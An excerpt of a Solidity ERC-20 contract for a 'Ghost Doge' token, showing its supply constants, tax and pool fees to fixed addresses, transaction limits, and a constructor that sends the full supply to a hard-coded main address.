...
contract Token is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1000 * 10**12 * 10**6;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Ghost Doge";
    string private _symbol = "Ghostdoge";
    uint8 private _decimals = 6;
    
    uint256 public _taxFee = 5;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _poolFeeA = 7;
    uint256 private _previousPoolFeeA = _poolFeeA;
    address public _poolAddressA = 0x000000000000000000000000000000000000dEaD;

    uint256 public _poolFeeB = 3;
    uint256 private _previousPoolFeeB = _poolFeeB;
    address public _poolAddressB = 0x712d84124546A143a42298dF0eE48DC5D3BfEC43;
    ...
    uint256 public _limitPairNumOf = 10000;
    uint public _limitPairTimeOf = 86400000;
    
    address public _mainAddress = 0x2BBD14aBE16E712CD9E8f12C1A1a84F9C6c513E7;
    ...
    uint256 public _maxTxAmount = 1000 * 10**12 * 10**6;
    uint256 private numTokensSellToAddToLiquidity = 1000 * 10**12 * 10**6;
    ...
    constructor () public {
        ...
        _isExcludedFromFee[_poolAddressB] = true;
        _giantWhaleOperator[address(this)] = true;
        _isExcludedFromFee[_mainAddress] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
        _tokenTransfer(_msgSender(),_mainAddress,_tTotal,false);
    ...
    function _takePool(address sender, uint256 tPoolAmoutA, uint256 tPoolAmoutB, uint256 tPoolAmoutC) private {
        ...
        if(tPoolAmoutC > 0){    
            ...
            _rOwned[_poolAddressC] = _rOwned[_poolAddressC].add(rPoolAmoutC);    
